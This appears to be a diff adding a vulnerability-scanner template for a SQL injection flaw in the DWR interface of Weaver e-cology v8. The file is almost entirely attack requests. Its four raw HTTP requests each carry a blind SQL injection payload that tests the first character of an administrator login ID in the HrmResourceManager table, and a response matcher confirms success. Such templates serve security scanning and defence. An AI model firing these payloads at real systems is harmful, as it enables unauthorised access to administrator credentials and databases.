@@ -1,0 +1,92 @@
+id: fanwei-ecology-v8-dwr-sqli
+info:
+  name: fanwei-ecology-v8-dwr-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - http://runtk.com/2023/08/29/%e6%b3%9b%e5%be%ae-ecology-dwr-sql-%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/
+  tags: ecology
+http:
+  - raw:
+      - |-
+        GET /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Content-Length: 251
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/plain
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
+        c0-param1=string:1
+        batchId=0
+      - |-
+        GET /dwr/call/plaincall/Validator.dwr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Content-Length: 251
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/plain
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
+        c0-param1=string:1
+        batchId=0
+      - |-
+        GET /dwr/call/plaincall/Validator.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Content-Length: 251
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/plain
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
+        c0-param1=string:1
+        batchId=0
+      - |-
+        GET /dwr/call/plaincall/1.dwr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Content-Length: 251
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/plain
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 and ascii((select substring(loginid,1,1)from HrmResourceManager))=115
+        c0-param1=string:1
+        batchId=0
+    matchers:
+      - type: word
+        part: body
+        words:
+          - dwr.engine.remoteHandleCallback
